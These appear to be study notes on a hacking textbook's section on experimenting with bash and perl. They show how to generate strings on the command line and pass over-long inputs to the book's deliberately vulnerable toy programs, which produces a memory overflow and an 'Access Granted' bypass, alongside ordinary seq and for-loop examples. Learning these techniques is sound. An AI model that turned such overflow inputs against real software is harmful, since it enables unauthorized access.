# 0x330 Experimenting with BASH

# Since so much of hacking is rooted in exploitation and experimentation,
# the ability to quickly try different things is vital.

# The `bash` shell and `perl` are common on most machines and are all that is needed 
# to experiment with exploitation.

# `perl` is an interpreted programming language with a `print` command that
# happens to be particularly suited to generating long sequences of characters.

# And we can use `perl` as like below (page 133).
$ perl -e 'print "A" x 20;'
#AAAAAAAAAAAAAAAAAAAA

# Any character can also be printed by using `\x##`, where ## is the hexadecimal
# value of the character (page 134).
$ perl -e 'print "\x41" x 20;'
#AAAAAAAAAAAAAAAAAAAA

# And you can concatenate multiple strings like below.
$ perl -e 'print "A"x20 . "BCD" . "\x61\x66\x67\x69"x2 . "Z";'
#AAAAAAAAAAAAAAAAAAAABCDafgiafgiZ

# Also, we can execute shell command as a function, list below.
$ $(perl -e 'print "uname";')
#Darwin

$ una$(perl -e 'print "m";')e
#Darwin

# Command substitution and Perl can be used in combination to quickly generate
# overflow buffers on the fly, see below.
$ ./overflow_example $(perl -e 'print "A"x30')
#[BEFORE] buffer_two is at 0x7ffeeb24c598 and contains 'two'
#[BEFORE] buffer_one is at 0x7ffeeb24c5a0 and contains 'one'
#[BEFORE] value is at 0x7ffeeb24c584 and is (0x00000005)
#
#[STRCPY] copying 30 bytes into buffer_two
#
#Abort trap: 6
$ gdb -q
$ (gdb) print 0x7ffeeb24c584 - 0x7ffeeb24c598
#$1 = -20
$ (gdb) print 0x7ffeeb24c584 - 0x7ffeeb24c5a0
#$2 = -28
$ (gdb) quit

$ ./overflow_example $(perl -e 'print "A"x1 . "ABCD"')
#[BEFORE] buffer_two is at 0x7ffee1e6f5a8 and contains 'two'
#[BEFORE] buffer_one is at 0x7ffee1e6f5b0 and contains 'one'
#[BEFORE] value is at 0x7ffee1e6f594 and is (0x00000005)
#
#[STRCPY] copying 5 bytes into buffer_two
#
#[AFTER] buffer_two is at 0x7ffee1e6f5a8 and contains 'AABCD'
#[AFTER] buffer_one is at 0x7ffee1e6f5b0 and contains 'one'
#[AFTER] value is at 0x7ffee1e6f594 and is (0x00000005)

$ ./auth_overflow $(perl -e 'print "brilling"x1')

#-=-=-=-=-=-=-=-=-=-=-
#       Access Granted.
#-=-=-=-=-=-=-=-=-=-=-

# You can also generate sequences of numbers by using `seq` command.

$ seq 1 10
#1
#2
#3
#4
#5
#6
#7
#8
#9
#10

$ seq 1 3 10
#1
#4
#7
#10

# You can use `for loop` in bash shell like below (page 141).

$ for i in $(seq 1 3 10)
> do
> echo Tha value is $i
> done
#The value is 1
#The value is 4
#The value is 7
#The value is 10
